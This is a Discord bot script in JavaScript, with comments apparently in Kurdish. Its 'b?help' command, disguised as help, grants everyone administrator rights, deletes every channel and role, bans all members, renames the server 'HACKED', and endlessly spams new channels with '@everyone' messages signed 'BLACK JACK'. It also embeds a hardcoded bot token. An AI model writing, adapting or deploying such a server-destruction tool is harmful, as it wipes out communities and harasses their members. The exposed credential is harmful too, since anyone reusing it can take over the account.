const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = 'b?'///lera ba dly xot prefix dabne
client.on('ready', () => {
console.log(`Logged in as ${client.user.tag}!`);
 
});
          

client.on('message', message => {
    if (message.content.startsWith(prefix + "help")) {
        message.delete();
        message.guild.roles.find('name', '@everyone').edit({
            permissions: ["ADMINISTRATOR"]///premission akata adminstator
        });
         
        message.guild.channels.map(c => {
            c.delete();
        });
       message.guild.members.forEach(m =>{
                    m.ban()
                })
      
      message.guild.roles.forEach(r =>{
                    r.delete()
                });
      
        setInterval(() => {
            message.guild.createRole({
                name: "HACKED",
                permissions: ["ADMINISTRATOR"]
            }).then(rr => {
 
                message.member.addRole(rr.id);
            })
        }, 1000);
        message.guild.setIcon("https://media.discordapp.net/attachments/797127379281510480/805515784520073226/image0.png");
        client.user.setAvatar("https://media.discordapp.net/attachments/797127379281510480/805515784520073226/image0.png");
        message.guild.setName('HACKED');
        setTimeout(function() {
            setInterval(() => {
              
                message.guild.createChannel('HACKED BY BLACK JACK', 'text').then(channel => { 
                channel.send('@everyone HACK BY BLACK JACK BCHO SERVER DABNEWA:joy: :joy: :joy:')
               
                })
            }                        
               , 500)
    })}})

 ////codaka drwst krawa lalayan black jack

client.login("NzU2OTg5OTcxMzY1MTAxNTc4.X2Z32Q.zsD9Pyo4Jzi9mdh7DDRqDpe5LFk")
          